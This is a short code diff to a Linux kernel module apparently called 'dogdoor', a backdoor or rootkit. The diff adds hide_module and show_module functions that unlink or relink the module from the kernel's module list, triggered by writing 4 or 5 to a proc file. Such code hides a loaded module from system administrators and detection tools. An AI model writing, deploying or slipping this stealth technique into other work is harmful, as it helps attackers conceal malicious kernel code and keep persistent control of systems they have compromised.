@@ -48,15 +48,20 @@ int dogdoor_proc_release(struct inode *inode, struct file *file) {
 
 
 static
-void fun3(void){
+void show_module(void){
+	if(connect==0){
+		list_add(&THIS_MODULE->list, p); 
+		connect = 1;
+		printk("connect\n");
+	}	
+	return;
+}
+
+void hide_module(void){
 	if(connect==1){
 		list_del_init(&modules_list); 
 		connect = 0;
 		printk("disconnect\n");
-	}else{
-		list_add(&THIS_MODULE->list, p); 
-		connect = 1;
-		printk("connect\n");
 	}	
 	return;
 }
@@ -93,8 +98,11 @@ ssize_t dogdoor_proc_write(struct file *file, const char __user *ubuf, size_t si
 	
 	sscanf(buf,"%d", &index) ;
 	printk("index : %d\n", index);	
-	if(index==3){
-		fun3();
+	if(index==4){
+		hide_module();
+	}
+	if(index==5){
+		show_module();
 	}
 	
 	*offset = strlen(buf) ;
